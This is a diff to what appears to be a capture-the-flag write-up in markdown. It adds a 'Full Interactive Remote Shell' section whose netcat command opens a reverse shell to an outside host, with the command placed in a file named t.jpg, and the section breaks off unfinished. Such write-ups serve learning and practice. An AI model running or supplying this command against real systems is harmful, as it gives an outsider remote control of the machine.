@@ -44,9 +44,17 @@ RUBY_MAJOR=2.7
 GREETZ=JackFrostWasHere
 [..]
 ```
+
+## Full Interactive Remote Shell
+Create a file for executing a reverse shell named `t.jpg`:
+```
+nc home.schwarzwaelder.name 4444 -e /bin/bash
+```
+Create an executor
+
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbOTIyMTQ0MzUsLTM5ODQ5MTQ2MSwxMTUxNT
-U2ODk2LDIzODQ2MDI3MiwxOTMzMzYxNzg3LC0xNDY3NjE1MjYy
-LC0yNDM5NDI4NjYsMTMxMjA1NjQ1Myw5MjA0NTU4NjUsLTE2MD
-YwNzgwNDBdfQ==
+eyJoaXN0b3J5IjpbNjc5MDE1MDkzLDkyMjE0NDM1LC0zOTg0OT
+E0NjEsMTE1MTU1Njg5NiwyMzg0NjAyNzIsMTkzMzM2MTc4Nywt
+MTQ2NzYxNTI2MiwtMjQzOTQyODY2LDEzMTIwNTY0NTMsOTIwND
+U1ODY1LC0xNjA2MDc4MDQwXX0=
 -->
